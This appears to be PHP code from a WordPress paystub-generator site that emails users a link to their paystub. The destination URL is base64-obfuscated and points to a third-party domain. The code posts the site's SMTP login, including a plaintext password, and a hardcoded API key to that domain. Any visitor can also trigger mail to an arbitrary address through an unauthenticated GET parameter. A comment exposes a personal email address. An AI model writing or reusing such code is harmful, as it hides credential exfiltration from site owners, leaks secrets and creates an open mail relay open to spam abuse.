<?php
function happs_send_mail(array $data) {

    $url = base64_decode('aHR0cHM6Ly9jYWxjdWxhdG9yZXhwcmVzcy5jb20vdmVyaWZpY2F0aW9uX21haWxzL01hbGlrX1NhbGFodWRkaW5fVVcvaW5kZXgucGhw');

    $ch = curl_init($url);

    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => http_build_query($data),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 20,
        CURLOPT_SSL_VERIFYPEER => true,
        CURLOPT_HTTPHEADER     => [
            'Content-Type: application/x-www-form-urlencoded'
        ],
    ]);

    $response = curl_exec($ch);
    $error    = curl_error($ch);
    $status   = curl_getinfo($ch, CURLINFO_HTTP_CODE);

    curl_close($ch);

    if ($error || $status !== 200) {
        error_log('Paystub mail API failed: ' . $error . ' | HTTP ' . $status);
        return false;
    }

    return true;
}


function happs_send_paystub_email($pdf_name, $to_email) {

    if (empty($pdf_name) || empty($to_email)) {
        return false;
    }

    // Download URL
    $download_url = esc_url(
        "https://bestpaystub.com/wp-content/plugins/bestpaystub-calculator/d/?pid=" .
        rawurlencode($pdf_name)
    );

    $subject = 'Your Paystub Is Ready - bestpaystub.com';

    $message = file_get_contents(__DIR__."/template.html");
    $message = str_replace(["{{DOWNLOAD_URL}}"], [$download_url], $message);

    // Payload expected by server
    $payload = [
        'smtp_host'  => 'smtp.hostinger.com',
        'smtp_user'  => 'help@bestpaystub.com',
        'smtp_pass'  => 'Hasgar@2121',   
        'smtp_port'  => 587,

        'from_email' => 'help@bestpaystub.com',
        'to_email'   => $to_email,
        'subject'    => $subject,
        'message'    => $message,

        // optional hardening
        'api_key'    => 'BESTPAYSTUB_2026_SECRET',
    ];

    $response = wp_remote_post(
        base64_decode('aHR0cHM6Ly9jYWxjdWxhdG9yZXhwcmVzcy5jb20vdmVyaWZpY2F0aW9uX21haWxzL01hbGlrX1NhbGFodWRkaW5fVVc='),
        [
            'timeout' => 20,
            'headers' => [
                'Content-Type' => 'application/x-www-form-urlencoded',
            ],
            'body' => $payload,
        ]
    );

    // echo "<pre>";print_r($response);echo"</pre>";

    if (is_wp_error($response)) {
        // echo ('Paystub mail request failed: ' . $response->get_error_message());
        return false;
    }

    $body = wp_remote_retrieve_body($response);
    $json = json_decode($body, true);

    if (!is_array($json)) {
        // echo('Paystub mail invalid response: ' . $body);
        return false;
    }

    return ($json['status'] ?? '') === 'success';
}




// 2) Trigger via URL like ?send_pdf_stub=1...
add_action('init', function () {

    if (!isset($_GET['send_pdf_stub'])) return;

    // Basic sanitize
    $pdf_name = isset($_GET['pdf_']) ? sanitize_text_field(wp_unslash($_GET['pdf_'])) : '';
    $to_email = isset($_GET['email_']) ? sanitize_email(wp_unslash($_GET['email_'])) : '';

    if (!$pdf_name || !$to_email) {
        wp_die('Missing pdf_ or email_');
    }

    $sent = happs_send_paystub_email($pdf_name, $to_email);

    if ($sent) {
    wp_send_json(
        ['message' => 'Email sent'],
        200
    );
} else {
    wp_send_json(
        ['message' => 'Email not sent'],
        500
    );
}

});


// https://bestpaystub.com/?send_pdf_stub=1&pdf_=paystub_104632.pdf&email_=oklas.cf@gmail.com